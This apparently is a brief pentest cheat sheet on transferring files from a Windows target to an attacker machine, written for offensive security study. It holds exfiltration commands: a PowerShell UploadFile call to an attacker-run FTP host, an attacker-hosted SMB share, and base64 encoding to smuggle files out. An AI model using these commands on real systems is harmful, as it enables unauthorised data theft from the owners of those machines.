# upload files

## Windows - Uploads commands

### Upload a file - FTP

launch on the attacker a ftp server using python

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

then on the target you can transfer whatever you want

```
(New-Object Net.WebClient).UploadFile('ftp://$monIp/ftp-hosts', '$cheminFichier')
```

### Upload a file - SMB

launch on the attacker a smb server using python

```bash
python3 smbserver.py -smb2support MYSHARE /path/to/shared/directory
```

then on the target

```
xcopy \server\MYSHARE\file.txt C:\path\to\local\directory\
```

### Transfer file from target to attacker

encode in b64 on the target

```
[Convert]::ToBase64String((Get-Content -path "$fichier" -Encoding byte))
```

then on the attacker

```bash
echo $base64 | base64 -d > $fichier
```